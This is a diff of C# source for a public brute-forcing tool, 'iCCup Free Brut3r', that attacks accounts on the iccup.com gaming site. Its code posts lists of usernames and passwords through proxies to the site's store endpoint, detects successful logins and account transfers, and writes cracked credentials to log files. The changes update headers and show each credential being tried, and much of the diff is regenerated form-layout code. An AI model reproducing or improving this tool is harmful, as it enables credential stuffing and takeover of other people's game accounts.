@@ -85,7 +85,11 @@ namespace UnrealIccupBruteforcer
         public Button PauseButton;
         public Button StartButton;
         public NotifyIcon BruTray;
-        public IContainer components;
+        private IContainer components;
+        public Label label5;
+        public Label CurrentLogin;
+        public Label label12;
+        public Label CurrentPassword;
         public TextBox MyProxy;
 
         protected override void WndProc(ref Message message)
@@ -760,8 +764,9 @@ namespace UnrealIccupBruteforcer
             {
                 HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com");
                 httpWebRequest.Method = "POST";
+                httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                 httpWebRequest.Referer = "https://iccup.com";
-                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2334.0 Safari/537.36";
+                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";
                 httpWebRequest.CookieContainer = new CookieContainer();
                 httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                 httpWebRequest.Timeout = 3000;
@@ -858,29 +863,42 @@ namespace UnrealIccupBruteforcer
                             Thread.Sleep(5000);
                         }
                         pause = false;
-                        string username = AbsolBruter.GlobalVars.BruteBase[index1].username;
-                        string password = AbsolBruter.GlobalVars.BruteBase[index1].password;
+                        string username = AbsolBruter.GlobalVars.BruteBase[index1].username.Trim();
+                        string password = AbsolBruter.GlobalVars.BruteBase[index1].password.Trim();
                         string end;
                         Uri responseUri;
                         try
                         {
                             HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com/store/buyItem/19/final/");
                             httpWebRequest.Method = "POST";
+                            httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                             httpWebRequest.Referer = "https://iccup.com/store/buyItem/19/step1.html";
-                            httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2334.0 Safari/537.36";
+                            httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";
                             httpWebRequest.CookieContainer = cookieContainer_0;
                             httpWebRequest.ContentType = "application/x-www-form-urlencoded";
+                            httpWebRequest.Headers.Add("DNT", "1");
                             httpWebRequest.Headers.Add("Accept-Encoding", "gzip, deflate");
                             httpWebRequest.Headers.Add("Origin", "https://iccup.com");
                             httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
 
                             string str3 = "ladder=5&nickname=" + username + "&password=" + password;
+                            try
+                            {
+                                CurrentLogin.Text = username;
+                                CurrentPassword.Text = password;
+                            }
+                            catch
+                            {
+
+                            }
+
                             httpWebRequest.ReadWriteTimeout = 5000;
                             httpWebRequest.Timeout = 5000;
                             httpWebRequest.Proxy = (IWebProxy)proxy;
                             StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                             streamWriter.Write(str3);
                             streamWriter.Close();
+                            Thread.Sleep(100);
                             HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                             Stream responseStream = response.GetResponseStream();
                             StreamReader streamReader = new StreamReader(responseStream);
@@ -913,10 +931,19 @@ namespace UnrealIccupBruteforcer
                         {
                             if (end != null && !(responseUri == (Uri)null) && (end.Length >= 200 && responseUri.AbsolutePath != null))
                             {
-                                 { ++CurCount; }
+                                File.AppendAllText("test.log", end);
+                                File.AppendAllText("test.log", "\n\n\n\n\n\n\n");
+                                File.AppendAllText("test.log", "LOOOOGIIIN:" + username + " = " + password);
+                                File.AppendAllText("test.log", "\n\n\n\n\n\n\n");
+
+                                File.AppendAllText("test2.log", responseUri.AbsolutePath);
+                                File.AppendAllText("test2.log", "\n\n\n\n\n\n\n");
+                                File.AppendAllText("test2.log", "LOOOOGIIIN:" + username + " = " + password);
+                                File.AppendAllText("test2.log", "\n\n\n\n\n\n\n");
+                                { ++CurCount; }
                                 if (end.IndexOf("S_checkmark.jpg") <= 0 && end.IndexOf("transfer-attention") <= 0 && responseUri.AbsolutePath.IndexOf("category/6") <= 0)
                                 {
-                                    if (responseUri.AbsolutePath.IndexOf("success") <= 0)
+                                    if (responseUri.AbsolutePath.IndexOf("success") <= 0 && end.IndexOf("Нельзя сделать трансфер") <= 0)
                                         goto label_58;
                                 }
                                 bool flag1 = end.IndexOf("transfer-attention") > 0;
@@ -1069,427 +1096,583 @@ namespace UnrealIccupBruteforcer
 
         public void InitializeComponent()
         {
-            components = (IContainer)new Container();
-            ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AbsolBruter));
-            PokePictBox = new PictureBox();
-            PokeGoTimer = new System.Windows.Forms.Timer(components);
-            ExitButton = new PictureBox();
-            TrayButton = new PictureBox();
-            BruteUsername = new TextBox();
-            BrutePassword = new TextBox();
-            CheckButton = new PictureBox();
-            label1 = new Label();
-            label2 = new Label();
-            label3 = new Label();
-            SwapMode = new PictureBox();
-            UsernamesForBrute = new Button();
-            PasswordForBrute = new Button();
-            SwapLoginTypeTimer = new System.Windows.Forms.Timer(components);
-            SeparatorLP = new TextBox();
-            LabelM1 = new Label();
-            LoadNickPwdSeperated = new Button();
-            LabelM3 = new Label();
-            LabelM2 = new Label();
-            label4 = new Label();
-            label6 = new Label();
-            UsersCount = new Label();
-            BaseLoaded = new PictureBox();
-            LoginIccupGetted = new PictureBox();
-            RunnedBrute = new PictureBox();
-            label7 = new Label();
-            label8 = new Label();
-            label9 = new Label();
-            label10 = new Label();
-            PcEnd = new Label();
-            PauseButton = new Button();
-            StartButton = new Button();
-            BruTray = new NotifyIcon(components);
-            MyProxy = new TextBox();
-            LogMyBox = new FuckListBox();
-            ((ISupportInitialize)PokePictBox).BeginInit();
-            ((ISupportInitialize)ExitButton).BeginInit();
-            ((ISupportInitialize)TrayButton).BeginInit();
-            ((ISupportInitialize)CheckButton).BeginInit();
-            ((ISupportInitialize)SwapMode).BeginInit();
-            ((ISupportInitialize)BaseLoaded).BeginInit();
-            ((ISupportInitialize)LoginIccupGetted).BeginInit();
-            ((ISupportInitialize)RunnedBrute).BeginInit();
-            SuspendLayout();
-            PokePictBox.BackColor = Color.Transparent;
-            PokePictBox.Image = (Image)AllResources.PokeLine;
-            PokePictBox.Location = new Point(0, 560);
-            PokePictBox.Name = "PokePictBox";
-            PokePictBox.Size = new Size(400, 40);
-            PokePictBox.TabIndex = 0;
-            PokePictBox.TabStop = false;
-            PokeGoTimer.Enabled = true;
-            PokeGoTimer.Interval = 50;
-            PokeGoTimer.Tick += new EventHandler(PokeGoTimer_Tick);
-            ExitButton.BackColor = Color.Transparent;
-            ExitButton.BackgroundImage = (Image)AllResources.ExitButton;
-            ExitButton.BackgroundImageLayout = ImageLayout.None;
-            ExitButton.Location = new Point(339, 12);
-            ExitButton.Name = "ExitButton";
-            ExitButton.Size = new Size(61, 55);
-            ExitButton.TabIndex = 1;
-            ExitButton.TabStop = false;
-            ExitButton.Click += new EventHandler(ExitButton_Click);
-            ExitButton.MouseDown += new MouseEventHandler(ExitButton_MouseDown);
-            ExitButton.MouseEnter += new EventHandler(ExitButton_MouseEnter);
-            ExitButton.MouseLeave += new EventHandler(ExitButton_MouseLeave);
-            ExitButton.MouseUp += new MouseEventHandler(ExitButton_MouseUp);
-            TrayButton.BackColor = Color.Transparent;
-            TrayButton.BackgroundImage = (Image)AllResources.TrayBtn;
-            TrayButton.BackgroundImageLayout = ImageLayout.None;
-            TrayButton.Location = new Point(269, 7);
-            TrayButton.Name = "TrayButton";
-            TrayButton.Size = new Size(66, 59);
-            TrayButton.TabIndex = 1;
-            TrayButton.TabStop = false;
-            TrayButton.Click += new EventHandler(TrayButton_Click);
-            TrayButton.MouseDown += new MouseEventHandler(TrayButton_MouseDown);
-            TrayButton.MouseEnter += new EventHandler(TrayButton_MouseEnter);
-            TrayButton.MouseLeave += new EventHandler(TrayButton_MouseLeave);
-            TrayButton.MouseUp += new MouseEventHandler(TrayButton_MouseUp);
-            BruteUsername.BackColor = Color.DimGray;
-            BruteUsername.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            BruteUsername.ForeColor = SystemColors.Menu;
-            BruteUsername.Location = new Point(126, 116);
-            BruteUsername.Name = "BruteUsername";
-            BruteUsername.Size = new Size(199, 27);
-            BruteUsername.TabIndex = 1;
-            BruteUsername.TextChanged += new EventHandler(BruteUsername_TextChanged);
-            BrutePassword.BackColor = Color.DimGray;
-            BrutePassword.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            BrutePassword.ForeColor = SystemColors.Menu;
-            BrutePassword.Location = new Point(126, 158);
-            BrutePassword.Name = "BrutePassword";
-            BrutePassword.Size = new Size(199, 27);
-            BrutePassword.TabIndex = 2;
-            BrutePassword.TextChanged += new EventHandler(BrutePassword_TextChanged);
-            CheckButton.BackColor = Color.Transparent;
-            CheckButton.BackgroundImage = (Image)AllResources.CheckBtn;
-            CheckButton.BackgroundImageLayout = ImageLayout.None;
-            CheckButton.Location = new Point(158, 190);
-            CheckButton.Name = "CheckButton";
-            CheckButton.Size = new Size(145, 40);
-            CheckButton.TabIndex = 3;
-            CheckButton.TabStop = false;
-            CheckButton.Click += new EventHandler(CheckButton_Click);
-            CheckButton.MouseDown += new MouseEventHandler(CheckButton_MouseDown);
-            CheckButton.MouseEnter += new EventHandler(CheckButton_MouseEnter);
-            CheckButton.MouseLeave += new EventHandler(CheckButton_MouseLeave);
-            CheckButton.MouseUp += new MouseEventHandler(CheckButton_MouseUp);
-            label1.AutoSize = true;
-            label1.BackColor = Color.Transparent;
-            label1.Font = new Font("Microsoft Sans Serif", 14f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            label1.Location = new Point(30, 138);
-            label1.Name = "label1";
-            label1.Size = new Size(69, 24);
-            label1.TabIndex = 4;
-            label1.Text = "Логин:";
-            label2.AutoSize = true;
-            label2.BackColor = Color.Transparent;
-            label2.Location = new Point(113, 90);
-            label2.Name = "label2";
-            label2.Size = new Size(228, 13);
-            label2.TabIndex = 5;
-            label2.Text = "Сюда нужно вставить любой логин iCCUp'а.";
-            label3.AutoSize = true;
-            label3.BackColor = Color.Transparent;
-            label3.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            label3.Location = new Point(24, 239);
-            label3.Name = "label3";
-            label3.Size = new Size(358, 13);
-            label3.TabIndex = 6;
-            label3.Text = "Теперь нужно выбрать метод загрузки логинов и паролей";
-            SwapMode.BackColor = Color.Transparent;
-            SwapMode.BackgroundImage = (Image)AllResources.MegoCheckBoxFirstpart;
-            SwapMode.BackgroundImageLayout = ImageLayout.Center;
-            SwapMode.Location = new Point(126, 263);
-            SwapMode.Name = "SwapMode";
-            SwapMode.Size = new Size(197, 78);
-            SwapMode.TabIndex = 7;
-            SwapMode.TabStop = false;
-            SwapMode.Click += new EventHandler(SwapMode_Click);
-            SwapMode.DragEnter += new DragEventHandler(SwapMode_DragEnter);
-            SwapMode.MouseDown += new MouseEventHandler(SwapMode_MouseDown);
-            SwapMode.MouseEnter += new EventHandler(SwapMode_MouseEnter);
-            SwapMode.MouseLeave += new EventHandler(SwapMode_MouseLeave);
-            SwapMode.MouseMove += new MouseEventHandler(SwapMode_MouseMove);
-            SwapMode.MouseUp += new MouseEventHandler(SwapMode_MouseUp);
-            UsernamesForBrute.BackColor = Color.DimGray;
-            UsernamesForBrute.BackgroundImage = (Image)AllResources.EditBox_;
-            UsernamesForBrute.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            UsernamesForBrute.ForeColor = SystemColors.ButtonFace;
-            UsernamesForBrute.Location = new Point(11, 265);
-            UsernamesForBrute.Name = "UsernamesForBrute";
-            UsernamesForBrute.Size = new Size(109, 27);
-            UsernamesForBrute.TabIndex = 3;
-            UsernamesForBrute.Text = "Ники";
-            UsernamesForBrute.UseVisualStyleBackColor = false;
-            UsernamesForBrute.Click += new EventHandler(UsernamesForBrute_Click);
-            PasswordForBrute.BackColor = Color.DimGray;
-            PasswordForBrute.BackgroundImage = (Image)AllResources.EditBox_;
-            PasswordForBrute.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            PasswordForBrute.ForeColor = SystemColors.ButtonFace;
-            PasswordForBrute.Location = new Point(12, 314);
-            PasswordForBrute.Name = "PasswordForBrute";
-            PasswordForBrute.Size = new Size(109, 27);
-            PasswordForBrute.TabIndex = 4;
-            PasswordForBrute.Text = "Пароли";
-            PasswordForBrute.UseVisualStyleBackColor = false;
-            PasswordForBrute.Click += new EventHandler(PasswordForBrute_Click);
-            SwapLoginTypeTimer.Enabled = true;
-            SwapLoginTypeTimer.Interval = 200;
-            SwapLoginTypeTimer.Tick += new EventHandler(SwapLoginTypeTimer_Tick);
-            SeparatorLP.BackColor = Color.DimGray;
-            SeparatorLP.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            SeparatorLP.ForeColor = SystemColors.Menu;
-            SeparatorLP.Location = new Point(38, 280);
-            SeparatorLP.Name = "SeparatorLP";
-            SeparatorLP.Size = new Size(46, 27);
-            SeparatorLP.TabIndex = 5;
-            SeparatorLP.Text = ";";
-            SeparatorLP.TextAlign = HorizontalAlignment.Center;
-            SeparatorLP.Visible = false;
-            LabelM1.AutoSize = true;
-            LabelM1.BackColor = Color.Transparent;
-            LabelM1.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            LabelM1.Location = new Point(8, 260);
-            LabelM1.Name = "LabelM1";
-            LabelM1.Size = new Size(105, 17);
-            LabelM1.TabIndex = 9;
-            LabelM1.Text = "Разделитель";
-            LabelM1.Visible = false;
-            LoadNickPwdSeperated.BackColor = Color.DimGray;
-            LoadNickPwdSeperated.BackgroundImage = (Image)AllResources.EditBox_;
-            LoadNickPwdSeperated.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            LoadNickPwdSeperated.ForeColor = SystemColors.ButtonFace;
-            LoadNickPwdSeperated.Location = new Point(11, 314);
-            LoadNickPwdSeperated.Name = "LoadNickPwdSeperated";
-            LoadNickPwdSeperated.Size = new Size(109, 27);
-            LoadNickPwdSeperated.TabIndex = 6;
-            LoadNickPwdSeperated.Text = "Открыть файл";
-            LoadNickPwdSeperated.UseVisualStyleBackColor = false;
-            LoadNickPwdSeperated.Visible = false;
-            LoadNickPwdSeperated.Click += new EventHandler(LoadNickPwdSeperated_Click);
-            LabelM3.AutoSize = true;
-            LabelM3.BackColor = Color.Transparent;
-            LabelM3.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            LabelM3.Location = new Point(90, 286);
-            LabelM3.Name = "LabelM3";
-            LabelM3.Size = new Size(26, 17);
-            LabelM3.TabIndex = 9;
-            LabelM3.Text = "——";
-            LabelM3.Visible = false;
-            LabelM2.AutoSize = true;
-            LabelM2.BackColor = Color.Transparent;
-            LabelM2.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            LabelM2.Location = new Point(6, 286);
-            LabelM2.Name = "LabelM2";
-            LabelM2.Size = new Size(26, 17);
-            LabelM2.TabIndex = 9;
-            LabelM2.Text = "——";
-            LabelM2.Visible = false;
-            label4.AutoSize = true;
-            label4.BackColor = Color.Transparent;
-            label4.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            label4.Location = new Point(15, 58);
-            label4.Name = "label4";
-            label4.Size = new Size(44, 17);
-            label4.TabIndex = 11;
-            label4.Text = "БАЗА";
-            label6.AutoSize = true;
-            label6.BackColor = Color.Transparent;
-            label6.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            label6.Location = new Point(24, 344);
-            label6.Name = "label6";
-            label6.Size = new Size(60, 17);
-            label6.TabIndex = 11;
-            label6.Text = "Прокси:";
-            UsersCount.AutoSize = true;
-            UsersCount.BackColor = Color.Transparent;
-            UsersCount.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            UsersCount.Location = new Point(224, 352);
-            UsersCount.Name = "UsersCount";
-            UsersCount.Size = new Size(16, 17);
-            UsersCount.TabIndex = 11;
-            UsersCount.Text = "0";
-            BaseLoaded.BackColor = Color.Transparent;
-            BaseLoaded.BackgroundImage = (Image)AllResources.Bad;
-            BaseLoaded.BackgroundImageLayout = ImageLayout.None;
-            BaseLoaded.Location = new Point(12, 12);
-            BaseLoaded.Name = "BaseLoaded";
-            BaseLoaded.Size = new Size(52, 48);
-            BaseLoaded.TabIndex = 13;
-            BaseLoaded.TabStop = false;
-            LoginIccupGetted.BackColor = Color.Transparent;
-            LoginIccupGetted.BackgroundImage = (Image)AllResources.Bad;
-            LoginIccupGetted.BackgroundImageLayout = ImageLayout.None;
-            LoginIccupGetted.Location = new Point(93, 12);
-            LoginIccupGetted.Name = "LoginIccupGetted";
-            LoginIccupGetted.Size = new Size(52, 48);
-            LoginIccupGetted.TabIndex = 13;
-            LoginIccupGetted.TabStop = false;
-            RunnedBrute.BackColor = Color.Transparent;
-            RunnedBrute.BackgroundImage = (Image)AllResources.Bad;
-            RunnedBrute.BackgroundImageLayout = ImageLayout.None;
-            RunnedBrute.Location = new Point(171, 12);
-            RunnedBrute.Name = "RunnedBrute";
-            RunnedBrute.Size = new Size(52, 48);
-            RunnedBrute.TabIndex = 13;
-            RunnedBrute.TabStop = false;
-            label7.AutoSize = true;
-            label7.BackColor = Color.Transparent;
-            label7.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            label7.Location = new Point(91, 58);
-            label7.Name = "label7";
-            label7.Size = new Size(57, 17);
-            label7.TabIndex = 11;
-            label7.Text = "ЛОГИН";
-            label8.AutoSize = true;
-            label8.BackColor = Color.Transparent;
-            label8.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            label8.Location = new Point(172, 59);
-            label8.Name = "label8";
-            label8.Size = new Size(53, 17);
-            label8.TabIndex = 11;
-            label8.Text = "СТАРТ";
-            label9.AutoSize = true;
-            label9.BackColor = Color.Transparent;
-            label9.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            label9.Location = new Point(155, 352);
-            label9.Name = "label9";
-            label9.Size = new Size(66, 17);
-            label9.TabIndex = 11;
-            label9.Text = "Логинов:";
-            label10.AutoSize = true;
-            label10.BackColor = Color.Transparent;
-            label10.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
-            label10.Location = new Point(133, 535);
-            label10.Name = "label10";
-            label10.Size = new Size(87, 17);
-            label10.TabIndex = 11;
-            label10.Text = "Завершено:";
-            PcEnd.AutoSize = true;
-            PcEnd.BackColor = Color.Transparent;
-            PcEnd.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            PcEnd.Location = new Point(217, 535);
-            PcEnd.Name = "PcEnd";
-            PcEnd.Size = new Size(30, 17);
-            PcEnd.TabIndex = 11;
-            PcEnd.Text = "0%";
-            PauseButton.BackColor = Color.DimGray;
-            PauseButton.BackgroundImage = (Image)AllResources.EditBox_;
-            PauseButton.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            PauseButton.ForeColor = SystemColors.ButtonFace;
-            PauseButton.Location = new Point(18, 530);
-            PauseButton.Name = "PauseButton";
-            PauseButton.Size = new Size(109, 27);
-            PauseButton.TabIndex = 8;
-            PauseButton.Text = "Пауза";
-            PauseButton.UseVisualStyleBackColor = false;
-            PauseButton.Click += new EventHandler(PauseButton_Click);
-            StartButton.BackColor = Color.DimGray;
-            StartButton.BackgroundImage = (Image)AllResources.EditBox_;
-            StartButton.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            StartButton.ForeColor = SystemColors.ButtonFace;
-            StartButton.Location = new Point(268, 530);
-            StartButton.Name = "StartButton";
-            StartButton.Size = new Size(109, 27);
-            StartButton.TabIndex = 9;
-            StartButton.Text = "Старт";
-            StartButton.UseVisualStyleBackColor = false;
-            StartButton.Click += new EventHandler(StartButton_Click);
-            BruTray.BalloonTipText = "Free bruteforcer for iCCup!";
-            BruTray.BalloonTipTitle = "iCCup Bruteforce";
-            BruTray.Icon = (Icon)AllResources.BruTray;
-            BruTray.Text = "iCCup public Bruteforcer";
-            BruTray.Visible = true;
-            BruTray.MouseDoubleClick += new MouseEventHandler(BruTray_MouseDoubleClick);
-            MyProxy.BackColor = Color.DimGray;
-            MyProxy.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            MyProxy.ForeColor = SystemColors.Menu;
-            MyProxy.Location = new Point(12, 364);
-            MyProxy.Name = "MyProxy";
-            MyProxy.Size = new Size((int)sbyte.MaxValue, 27);
-            MyProxy.TabIndex = 5;
-            MyProxy.Text = "127.0.0.1";
-            MyProxy.TextAlign = HorizontalAlignment.Center;
-            MyProxy.TextChanged += new EventHandler(MyProxy_TextChanged);
-            LogMyBox.BackColor = Color.Transparent;
-            LogMyBox.DrawMode = DrawMode.OwnerDrawVariable;
-            LogMyBox.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
-            LogMyBox.ForeColor = SystemColors.Menu;
-            LogMyBox.FormattingEnabled = true;
-            LogMyBox.ItemHeight = 15;
-            LogMyBox.Items.AddRange(new object[5]
-            {
-        (object) " ",
-        (object) "  iCCup BruteForce by Absol(d3scene.ru) ",
-        (object) "   Free for public lvl2.",
-        (object) " ",
-        (object) " "
-            });
-            LogMyBox.Location = new Point(12, 390);
-            LogMyBox.Name = "LogMyBox";
-            LogMyBox.Size = new Size(370, 134);
-            LogMyBox.TabIndex = 10;
-            AutoScaleDimensions = new SizeF(6f, 13f);
-            AutoScaleMode = AutoScaleMode.Font;
-            BackgroundImage = (Image)AllResources.MainForm;
-            BackgroundImageLayout = ImageLayout.None;
-            ClientSize = new Size(400, 600);
-            Controls.Add((Control)LabelM1);
-            Controls.Add((Control)RunnedBrute);
-            Controls.Add((Control)LoginIccupGetted);
-            Controls.Add((Control)BaseLoaded);
-            Controls.Add((Control)LogMyBox);
-            Controls.Add((Control)label9);
-            Controls.Add((Control)label6);
-            Controls.Add((Control)PcEnd);
-            Controls.Add((Control)UsersCount);
-            Controls.Add((Control)label10);
-            Controls.Add((Control)label8);
-            Controls.Add((Control)label7);
-            Controls.Add((Control)label4);
-            Controls.Add((Control)LabelM2);
-            Controls.Add((Control)LabelM3);
-            Controls.Add((Control)StartButton);
-            Controls.Add((Control)PauseButton);
-            Controls.Add((Control)SwapMode);
-            Controls.Add((Control)label3);
-            Controls.Add((Control)label2);
-            Controls.Add((Control)label1);
-            Controls.Add((Control)CheckButton);
-            Controls.Add((Control)BrutePassword);
-            Controls.Add((Control)BruteUsername);
-            Controls.Add((Control)TrayButton);
-            Controls.Add((Control)ExitButton);
-            Controls.Add((Control)PokePictBox);
-            Controls.Add((Control)LoadNickPwdSeperated);
-            Controls.Add((Control)MyProxy);
-            Controls.Add((Control)SeparatorLP);
-            Controls.Add((Control)UsernamesForBrute);
-            Controls.Add((Control)PasswordForBrute);
-            FormBorderStyle = FormBorderStyle.None;
-            Icon = (Icon)AllResources.Icon;
-            Name = "AbsolFreeBrut3Force";
-            StartPosition = FormStartPosition.CenterScreen;
-            Text = "iCCup Free Brut3r";
-            Load += new EventHandler(AbsolFreeBrut3Force_Load);
-            Resize += new EventHandler(AbsolFreeBrut3Force_Resize);
-            ((ISupportInitialize)PokePictBox).EndInit();
-            ((ISupportInitialize)ExitButton).EndInit();
-            ((ISupportInitialize)TrayButton).EndInit();
-            ((ISupportInitialize)CheckButton).EndInit();
-            ((ISupportInitialize)SwapMode).EndInit();
-            ((ISupportInitialize)BaseLoaded).EndInit();
-            ((ISupportInitialize)LoginIccupGetted).EndInit();
-            ((ISupportInitialize)RunnedBrute).EndInit();
-            ResumeLayout(false);
-            PerformLayout();
+            this.components = new System.ComponentModel.Container();
+            this.PokePictBox = new System.Windows.Forms.PictureBox();
+            this.PokeGoTimer = new System.Windows.Forms.Timer(this.components);
+            this.ExitButton = new System.Windows.Forms.PictureBox();
+            this.TrayButton = new System.Windows.Forms.PictureBox();
+            this.BruteUsername = new System.Windows.Forms.TextBox();
+            this.BrutePassword = new System.Windows.Forms.TextBox();
+            this.CheckButton = new System.Windows.Forms.PictureBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.SwapMode = new System.Windows.Forms.PictureBox();
+            this.UsernamesForBrute = new System.Windows.Forms.Button();
+            this.PasswordForBrute = new System.Windows.Forms.Button();
+            this.SwapLoginTypeTimer = new System.Windows.Forms.Timer(this.components);
+            this.SeparatorLP = new System.Windows.Forms.TextBox();
+            this.LabelM1 = new System.Windows.Forms.Label();
+            this.LoadNickPwdSeperated = new System.Windows.Forms.Button();
+            this.LabelM3 = new System.Windows.Forms.Label();
+            this.LabelM2 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label6 = new System.Windows.Forms.Label();
+            this.UsersCount = new System.Windows.Forms.Label();
+            this.BaseLoaded = new System.Windows.Forms.PictureBox();
+            this.LoginIccupGetted = new System.Windows.Forms.PictureBox();
+            this.RunnedBrute = new System.Windows.Forms.PictureBox();
+            this.label7 = new System.Windows.Forms.Label();
+            this.label8 = new System.Windows.Forms.Label();
+            this.label9 = new System.Windows.Forms.Label();
+            this.label10 = new System.Windows.Forms.Label();
+            this.PcEnd = new System.Windows.Forms.Label();
+            this.PauseButton = new System.Windows.Forms.Button();
+            this.StartButton = new System.Windows.Forms.Button();
+            this.BruTray = new System.Windows.Forms.NotifyIcon(this.components);
+            this.MyProxy = new System.Windows.Forms.TextBox();
+            this.LogMyBox = new UnrealIccupBruteforcer.FuckListBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.CurrentLogin = new System.Windows.Forms.Label();
+            this.label12 = new System.Windows.Forms.Label();
+            this.CurrentPassword = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.PokePictBox)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.ExitButton)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.TrayButton)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.CheckButton)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.SwapMode)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.BaseLoaded)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.LoginIccupGetted)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.RunnedBrute)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // PokePictBox
+            // 
+            this.PokePictBox.BackColor = System.Drawing.Color.Transparent;
+            this.PokePictBox.Image = global::UnrealIccupBruteforcer.AllResources.PokeLine;
+            this.PokePictBox.Location = new System.Drawing.Point(0, 560);
+            this.PokePictBox.Name = "PokePictBox";
+            this.PokePictBox.Size = new System.Drawing.Size(400, 40);
+            this.PokePictBox.TabIndex = 0;
+            this.PokePictBox.TabStop = false;
+            // 
+            // PokeGoTimer
+            // 
+            this.PokeGoTimer.Enabled = true;
+            this.PokeGoTimer.Interval = 50;
+            this.PokeGoTimer.Tick += new System.EventHandler(this.PokeGoTimer_Tick);
+            // 
+            // ExitButton
+            // 
+            this.ExitButton.BackColor = System.Drawing.Color.Transparent;
+            this.ExitButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.ExitButton;
+            this.ExitButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.ExitButton.Location = new System.Drawing.Point(339, 12);
+            this.ExitButton.Name = "ExitButton";
+            this.ExitButton.Size = new System.Drawing.Size(61, 55);
+            this.ExitButton.TabIndex = 1;
+            this.ExitButton.TabStop = false;
+            this.ExitButton.Click += new System.EventHandler(this.ExitButton_Click);
+            this.ExitButton.MouseDown += new System.Windows.Forms.MouseEventHandler(this.ExitButton_MouseDown);
+            this.ExitButton.MouseEnter += new System.EventHandler(this.ExitButton_MouseEnter);
+            this.ExitButton.MouseLeave += new System.EventHandler(this.ExitButton_MouseLeave);
+            this.ExitButton.MouseUp += new System.Windows.Forms.MouseEventHandler(this.ExitButton_MouseUp);
+            // 
+            // TrayButton
+            // 
+            this.TrayButton.BackColor = System.Drawing.Color.Transparent;
+            this.TrayButton.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.TrayBtn;
+            this.TrayButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.TrayButton.Location = new System.Drawing.Point(269, 7);
+            this.TrayButton.Name = "TrayButton";
+            this.TrayButton.Size = new System.Drawing.Size(66, 59);
+            this.TrayButton.TabIndex = 1;
+            this.TrayButton.TabStop = false;
+            this.TrayButton.Click += new System.EventHandler(this.TrayButton_Click);
+            this.TrayButton.MouseDown += new System.Windows.Forms.MouseEventHandler(this.TrayButton_MouseDown);
